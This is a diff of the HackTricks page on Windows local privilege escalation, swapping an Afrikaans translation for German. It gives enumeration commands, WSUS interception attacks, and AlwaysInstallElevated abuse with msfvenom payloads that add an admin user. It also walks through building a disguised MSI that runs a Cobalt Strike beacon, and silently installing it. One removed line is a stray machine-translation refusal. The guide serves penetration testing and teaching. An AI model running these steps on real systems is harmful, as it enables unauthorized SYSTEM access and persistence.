@@ -1,27 +1,27 @@
 # Windows Local Privilege Escalation
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
-### **Beste hulpmiddel om na Windows plaaslike privilige eskalasie vektore te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Beste Tool zur Suche nach Windows-Lokalen Privileg-Eskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
-## Begin Windows Teorie
+## Initiale Windows-Theorie
 
-### Toegangstokens
+### Zugriffstoken
 
-**As jy nie weet wat Windows Toegangstokens is nie, lees die volgende bladsy voordat jy voortgaan:**
+**Wenn du nicht weißt, was Windows-Zugriffstoken sind, lies die folgende Seite, bevor du fortfährst:**
 
 {% content-ref url="access-tokens.md" %}
 [access-tokens.md](access-tokens.md)
@@ -29,33 +29,33 @@ Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-
 
 ### ACLs - DACLs/SACLs/ACEs
 
-**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**
+**Überprüfe die folgende Seite für weitere Informationen zu ACLs - DACLs/SACLs/ACEs:**
 
 {% content-ref url="acls-dacls-sacls-aces.md" %}
 [acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
 {% endcontent-ref %}
 
-### Integriteitsvlakke
+### Integritätsstufen
 
-**As jy nie weet wat integriteitsvlakke in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**
+**Wenn du nicht weißt, was Integritätsstufen in Windows sind, solltest du die folgende Seite lesen, bevor du fortfährst:**
 
 {% content-ref url="integrity-levels.md" %}
 [integrity-levels.md](integrity-levels.md)
 {% endcontent-ref %}
 
-## Windows Sekuriteitsbeheer
+## Windows-Sicherheitskontrollen
 
-Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel te evalueer**, uitvoerbare lêers te loop of selfs jou **aktiwiteite te ontdek**. Jy moet **lees** die volgende **bladsy** en **evalueer** al hierdie **verdedigings** **meganismes** voordat jy die privilige eskalasie evaluering begin:
+Es gibt verschiedene Dinge in Windows, die **dich daran hindern könnten, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite** **lesen** und all diese **Abwehrmechanismen** **enumerieren**, bevor du mit der Privileg-Eskalationsenumeration beginnst:
 
 {% content-ref url="../authentication-credentials-uac-and-efs/" %}
 [authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
 {% endcontent-ref %}
 
-## Stelselinligting
+## Systeminfo
 
-### Weergawe-inligting evaluering
+### Versionsinfo-Enumeration
 
-Kyk of die Windows weergawe enige bekende kwesbaarheid het (kyk ook na die toegepaste patches).
+Überprüfe, ob die Windows-Version bekannte Schwachstellen aufweist (überprüfe auch die angewendeten Patches).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -70,35 +70,35 @@ Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
 ### Version Exploits
 
-This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.
+Diese [Seite](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Microsoft-Sicherheitsanfälligkeiten zu suchen. Diese Datenbank hat mehr als 4.700 Sicherheitsanfälligkeiten und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.
 
-**On the system**
+**Auf dem System**
 
 * _post/windows/gather/enum\_patches_
 * _post/multi/recon/local\_exploit\_suggester_
 * [_watson_](https://github.com/rasta-mouse/Watson)
-* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_
+* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_
 
-**Locally with system information**
+**Lokal mit Systeminformationen**
 
 * [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 * [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
-**Github repos of exploits:**
+**Github-Repos von Exploits:**
 
 * [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 * [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
 * [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
 
-### Environment
+### Umgebung
 
-Enige geloofsbriewe/lekke inligting wat in die omgewingsveranderlikes gestoor is?
+Sind irgendwelche Anmeldeinformationen/saftige Informationen in den Umgebungsvariablen gespeichert?
 ```bash
 set
 dir env:
 Get-ChildItem Env: | ft Key,Value -AutoSize
 ```
-### PowerShell Geskiedenis
+### PowerShell-Historie
 ```bash
 ConsoleHost_history #Find the PATH where is saved
 
@@ -108,9 +108,9 @@ type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.tx
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
-### PowerShell Transkripsie lêers
+### PowerShell-Transkriptdateien
 
-Jy kan leer hoe om dit aan te skakel in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
+Sie können lernen, wie man dies aktiviert unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
 ```bash
 #Check is enable in the registry
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
@@ -123,41 +123,41 @@ dir C:\Transcripts
 Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
 Stop-Transcript
 ```
-### PowerShell Module Logging
+### PowerShell Modulprotokollierung
 
-Besonderhede van PowerShell-pyplyn-uitvoerings word geregistreer, wat uitgevoerde opdragte, opdrag-aanroepe en dele van skrifte insluit. egter, volledige uitvoeringsbesonderhede en uitvoerresultate mag nie vasgelê word nie.
+Details zu PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teile von Skripten. Es könnten jedoch nicht alle Ausführungsdetails und Ausgabeergebnisse erfasst werden.
 
-Om dit te aktiveer, volg die instruksies in die "Transkripsie-lêers" afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
+Um dies zu aktivieren, folgen Sie den Anweisungen im Abschnitt "Transkriptdateien" der Dokumentation und wählen Sie **"Modulprotokollierung"** anstelle von **"Powershell-Transkription"**.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 ```
-Om die laaste 15 gebeurtenisse van PowersShell-logs te sien, kan jy uitvoer:
+Um die letzten 15 Ereignisse aus den Powershell-Protokollen anzuzeigen, können Sie ausführen:
 ```bash
 Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-'n Volledige aktiwiteit en volledige inhoud rekord van die skrip se uitvoering word vasgevang, wat verseker dat elke blok kode gedokumenteer word soos dit loop. Hierdie proses behou 'n omvattende oudit spoor van elke aktiwiteit, waardevol vir forensiese ondersoek en die analise van kwaadwillige gedrag. Deur alle aktiwiteit op die tydstip van uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
+Ein vollständiger Aktivitäts- und Inhaltsnachweis der Ausführung des Skripts wird erfasst, um sicherzustellen, dass jeder Codeblock dokumentiert wird, während er ausgeführt wird. Dieser Prozess bewahrt eine umfassende Prüfspur jeder Aktivität, die für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Logging events vir die Script Block kan gevind word binne die Windows Event Viewer by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
-Om die laaste 20 gebeurtenisse te sien kan jy gebruik maak van:
+Die Protokollereignisse für den Script Block können im Windows-Ereignisanzeiger unter dem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Betrieb** gefunden werden.\
+Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
-### Internet Instellings
+### Internet-Einstellungen
 ```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
-### Skyfies
+### Laufwerke
 ```bash
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
@@ -165,63 +165,63 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 ```
 ## WSUS
 
-Jy kan die stelsel kompromitteer as die opdaterings nie met http**S** versoek word nie, maar met http.
+Sie können das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.
 
-Jy begin deur te kyk of die netwerk 'n nie-SSL WSUS-opdatering gebruik deur die volgende uit te voer:
+Sie beginnen damit, zu überprüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem Sie Folgendes ausführen:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
-As you have not provided the complete text to translate, I cannot proceed with the translation. Please provide the relevant English text you would like translated to Afrikaans.
+Wenn Sie eine Antwort wie folgt erhalten:
 ```bash
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
 ```
-En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gelyk is aan `1`.
+Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` gleich `1` ist.
 
-Dan, **dit is uitbuitbaar.** As die laaste register gelyk is aan 0, sal die WSUS-invoer geïgnoreer word.
+Dann ist **es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich 0 ist, wird der WSUS-Eintrag ignoriert.
 
-Om hierdie kwesbaarhede te benut, kan jy gereedskap soos: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik - Dit is MiTM gewapende uitbuitingskripte om 'valse' opdaterings in nie-SSL WSUS-verkeer in te spuit.
+Um diese Schwachstellen auszunutzen, können Sie Tools wie: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden - Dies sind MiTM-waffenfähige Exploit-Skripte, um 'falsche' Updates in nicht-SSL WSUS-Verkehr einzuspeisen.
 
-Lees die navorsing hier:
+Lesen Sie die Forschung hier:
 
 {% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}
 
 **WSUS CVE-2020-1013**
 
-[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
-Basies, dit is die fout wat hierdie fout uitbuit:
+[**Lesen Sie den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
+Im Grunde ist dies der Fehler, den dieser Bug ausnutzt:
 
-> As ons die mag het om ons plaaslike gebruikersproxy te wysig, en Windows Updates die proxy gebruik wat in Internet Explorer se instellings geconfigureer is, het ons dus die mag om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te loop om ons eie verkeer te onderskep en kode as 'n verhoogde gebruiker op ons bates te loop.
+> Wenn wir die Möglichkeit haben, unseren lokalen Benutzerproxy zu ändern, und Windows Updates den im Internet Explorer konfigurierten Proxy verwendet, haben wir daher die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Verkehr abzufangen und Code als erhöhter Benutzer auf unserem Asset auszuführen.
 >
-> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, sal dit ook sy sertifikaatwinkel gebruik. As ons 'n self-ondertekende sertifikaat vir die WSUS-hostnaam genereer en hierdie sertifikaat in die huidige gebruiker se sertifikaatwinkel voeg, sal ons in staat wees om beide HTTP en HTTPS WSUS-verkeer te onderskep. WSUS gebruik geen HSTS-agtige meganismes om 'n vertroue-op-eerste-gebruik tipe validasie op die sertifikaat te implementeer nie. As die sertifikaat wat aangebied word deur die gebruiker vertrou word en die korrekte hostnaam het, sal dit deur die diens aanvaar word.
+> Darüber hinaus verwendet der WSUS-Dienst die Einstellungen des aktuellen Benutzers, daher wird auch dessen Zertifikatspeicher verwendet. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen generieren und dieses Zertifikat in den Zertifikatspeicher des aktuellen Benutzers einfügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Vertrauensprüfung bei der ersten Verwendung auf dem Zertifikat zu implementieren. Wenn das präsentierte Zertifikat vom Benutzer vertraut wird und den richtigen Hostnamen hat, wird es vom Dienst akzeptiert.
 
-Jy kan hierdie kwesbaarheid uitbuit met die gereedskap [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit bevry is).
+Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).
 
 ## KrbRelayUp
 
-'n **Plaaslike privilige-eskalasie** kwesbaarheid bestaan in Windows **domein** omgewings onder spesifieke toestande. Hierdie toestande sluit omgewings in waar **LDAP-handtekening nie afgedwing word nie,** gebruikers self-regte het wat hulle toelaat om **Hulpbron-gebaseerde Beperkte Afvaardiging (RBCD)** te konfigureer, en die vermoë vir gebruikers om rekenaars binne die domein te skep. Dit is belangrik om te noem dat hierdie **vereistes** nagekom word met **standaardinstellings**.
+Eine **lokale Privilegieneskalation**-Schwachstelle existiert in Windows **Domänen**-Umgebungen unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP-Signierung nicht durchgesetzt wird,** Benutzer Selbstrechte besitzen, die es ihnen ermöglichen, **ressourcenbasierte eingeschränkte Delegation (RBCD)** zu konfigurieren, und die Fähigkeit für Benutzer, Computer innerhalb der Domäne zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit **Standard-Einstellungen** erfüllt sind.
 
-Vind die **uitbuiting in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
+Finden Sie den **Exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
-Vir meer inligting oor die vloei van die aanval, kyk [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
+Für weitere Informationen über den Ablauf des Angriffs überprüfen Sie [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)
 
 ## AlwaysInstallElevated
 
-**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), kan gebruikers van enige privilige **installeer** (uitvoer) `*.msi` lêers as NT AUTHORITY\\**SYSTEM**.
+**Wenn** diese 2 Registrierungen **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
-### Metasploit payloads
+### Metasploit-Payloads
 ```bash
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
-If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
+Wenn Sie eine Meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.
 
 ### PowerUP
 
-Gebruik die `Write-UserAddMSI` opdrag van power-up om binne die huidige gids 'n Windows MSI-binary te skep om voorregte te verhoog. Hierdie skrip skryf 'n vooraf saamgestelde MSI-installer wat vra vir 'n gebruiker/groep toevoeging (so jy sal GIU-toegang nodig hê):
+Verwenden Sie den Befehl `Write-UserAddMSI` von PowerUP, um im aktuellen Verzeichnis eine Windows MSI-Binärdatei zu erstellen, um Privilegien zu eskalieren. Dieses Skript erstellt einen vorkompilierten MSI-Installer, der nach einer Benutzer-/Gruppenzusammenführung fragt (Sie benötigen also GUI-Zugriff):
 ```
 Write-UserAddMSI
 ```
@@ -229,7 +229,7 @@ Just execute the created binary to escalate privileges.
 
 ### MSI Wrapper
 
-Lees hierdie tutoriaal om te leer hoe om 'n MSI-wrapper te skep met hierdie gereedskap. Let daarop dat jy 'n "**.bat**" lêer kan omhul as jy **net** wil **uitvoer** **opdraglyne**.
+Lesen Sie dieses Tutorial, um zu erfahren, wie Sie einen MSI-Wrapper mit diesen Tools erstellen. Beachten Sie, dass Sie eine "**.bat**"-Datei umwickeln können, wenn Sie **nur** **Befehlszeilen** **ausführen** möchten.
 
 {% content-ref url="msi-wrapper.md" %}
 [msi-wrapper.md](msi-wrapper.md)
@@ -243,44 +243,44 @@ Lees hierdie tutoriaal om te leer hoe om 'n MSI-wrapper te skep met hierdie gere
 
 ### Create MSI with Visual Studio
 
-* **Genereer** met Cobalt Strike of Metasploit 'n **nuwe Windows EXE TCP payload** in `C:\privesc\beacon.exe`
-* Open **Visual Studio**, kies **Skep 'n nuwe projek** en tik "installer" in die soekboks. Kies die **Setup Wizard** projek en klik **Volgende**.
-* Gee die projek 'n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** vir die ligging, kies **plaas oplossing en projek in dieselfde gids**, en klik **Skep**.
-* Hou aan om **Volgende** te klik totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Voeg by** en kies die Beacon payload wat jy pas gegenereer het. Klik dan op **Voltooi**.
-* Beklemtoon die **AlwaysPrivesc** projek in die **Oplossing Verkenner** en in die **Eienskappe**, verander **TargetPlatform** van **x86** na **x64**.
-* Daar is ander eienskappe wat jy kan verander, soos die **Skrywer** en **Fabrikant** wat die geïnstalleerde app meer wettig kan laat lyk.
-* Regsklik op die projek en kies **Kyk > Aangepaste Aksies**.
-* Regsklik op **Installeer** en kies **Voeg Aangepaste Aksie by**.
-* Dubbelklik op **Toepassing Gids**, kies jou **beacon.exe** lêer en klik **OK**. Dit sal verseker dat die beacon payload uitgevoer word sodra die installateur gedraai word.
-* Onder die **Aangepaste Aksie Eienskappe**, verander **Run64Bit** na **Waar**.
-* Laastens, **bou dit**.
-* As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` vertoon word, maak seker jy stel die platform op x64.
+* **Generieren** Sie mit Cobalt Strike oder Metasploit eine **neue Windows EXE TCP-Nutzlast** in `C:\privesc\beacon.exe`
+* Öffnen Sie **Visual Studio**, wählen Sie **Ein neues Projekt erstellen** und geben Sie "installer" in das Suchfeld ein. Wählen Sie das **Setup Wizard**-Projekt und klicken Sie auf **Weiter**.
+* Geben Sie dem Projekt einen Namen, wie **AlwaysPrivesc**, verwenden Sie **`C:\privesc`** für den Speicherort, wählen Sie **Lösung und Projekt im selben Verzeichnis platzieren** und klicken Sie auf **Erstellen**.
+* Klicken Sie weiter auf **Weiter**, bis Sie zu Schritt 3 von 4 (Dateien auswählen) gelangen. Klicken Sie auf **Hinzufügen** und wählen Sie die gerade generierte Beacon-Nutzlast aus. Klicken Sie dann auf **Fertigstellen**.
+* Markieren Sie das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändern Sie in den **Eigenschaften** **TargetPlatform** von **x86** auf **x64**.
+* Es gibt andere Eigenschaften, die Sie ändern können, wie den **Autor** und den **Hersteller**, die die installierte App legitimer erscheinen lassen können.
+* Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **Ansicht > Benutzerdefinierte Aktionen**.
+* Klicken Sie mit der rechten Maustaste auf **Installieren** und wählen Sie **Benutzerdefinierte Aktion hinzufügen**.
+* Doppelklicken Sie auf **Anwendungsordner**, wählen Sie Ihre **beacon.exe**-Datei aus und klicken Sie auf **OK**. Dies stellt sicher, dass die Beacon-Nutzlast ausgeführt wird, sobald der Installer gestartet wird.
+* Ändern Sie unter den **Eigenschaften der benutzerdefinierten Aktion** **Run64Bit** in **True**.
+* Schließlich **bauen** Sie es.
+* Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stellen Sie sicher, dass Sie die Plattform auf x64 eingestellt haben.
 
 ### MSI Installation
 
-Om die **installasie** van die kwaadwillige `.msi` lêer in **agtergrond** uit te voer:
+Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
-Om hierdie kwesbaarheid te benut, kan jy gebruik maak van: _exploit/windows/local/always\_install\_elevated_
+Um diese Schwachstelle auszunutzen, können Sie verwenden: _exploit/windows/local/always\_install\_elevated_
 
-## Antivrus en Detektore
+## Antivirus und Detektoren
 
-### Ouditinstellings
+### Audit-Einstellungen
 
-Hierdie instellings bepaal wat **gelog** word, so jy moet aandag gee
+Diese Einstellungen entscheiden, was **protokolliert** wird, daher sollten Sie darauf achten
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
 ### WEF
 
-Windows Event Forwarding, is interessant om te weet waar die logs gestuur word
+Windows Event Forwarding, es ist interessant zu wissen, wohin die Protokolle gesendet werden.
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
 ```
 ### LAPS
 
-**LAPS** is ontwerp vir die **bestuur van plaaslike Administrateur wagwoorde**, wat verseker dat elke wagwoord **uniek, ewekansig, en gereeld opgedateer** word op rekenaars wat aan 'n domein gekoppel is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs deur gebruikers wat voldoende regte deur ACLs toegeken is, toegang verkry, wat hulle toelaat om plaaslike admin wagwoorde te sien indien gemagtig.
+**LAPS** ist für die **Verwaltung von lokalen Administratorpasswörtern** konzipiert, die sicherstellen, dass jedes Passwort **einzigartig, randomisiert und regelmäßig aktualisiert** wird auf Computern, die einer Domäne beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, die über ausreichende Berechtigungen durch ACLs verfügen, die es ihnen ermöglichen, lokale Admin-Passwörter einzusehen, wenn sie autorisiert sind.
 
 {% content-ref url="../active-directory-methodology/laps.md" %}
 [laps.md](../active-directory-methodology/laps.md)
@@ -288,36 +288,36 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-As aktief, **plank-teks wagwoorde word in LSASS** (Local Security Authority Subsystem Service) gestoor.\
-[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
+Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
+[**Weitere Informationen zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
-### LSA-beskerming
+### LSA-Schutz
 
-Begin met **Windows 8.1** het Microsoft verbeterde beskerming vir die Plaaslike Sekuriteitsowerheid (LSA) bekendgestel om pogings deur onbetroubare prosesse te **blokkeer** om **sy geheue** te **lees** of kode in te spuit, wat die stelsel verder beveilig.\
-[**Meer inligting oor LSA-beskerming hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
+Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** untrusted Prozesse zu **blockieren**, **ihren Speicher** zu **lesen** oder Code zu injizieren, was das System weiter absichert.\
+[**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om die geloofsbriewe wat op 'n toestel gestoor is, te beskerm teen bedreigings soos pass-the-hash-aanvalle.| [**Meer inligting oor Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie Pass-the-Hash-Angriffen zu schützen.| [**Weitere Informationen zu Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
-### Gekapte Kredensiale
+### Cached Credentials
 
-**Domein kredensiale** word geverifieer deur die **Plaaslike Sekuriteitsowerheid** (LSA) en gebruik deur bedryfstelselskomponente. Wanneer 'n gebruiker se aanmelddata geverifieer word deur 'n geregistreerde sekuriteitspakket, word domein kredensiale vir die gebruiker tipies gevestig.\
-[**Meer inligting oor Gekapte Kredensiale hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
+**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Sicherheits-Paket authentifiziert werden, werden normalerweise Domänenanmeldeinformationen für den Benutzer erstellt.\
+[**Mehr Informationen zu Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## Users & Groups
+## Benutzer & Gruppen
 
-### Enumerate Users & Groups
+### Benutzer & Gruppen auflisten
 
-Jy moet kyk of enige van die groepe waartoe jy behoort interessante regte het
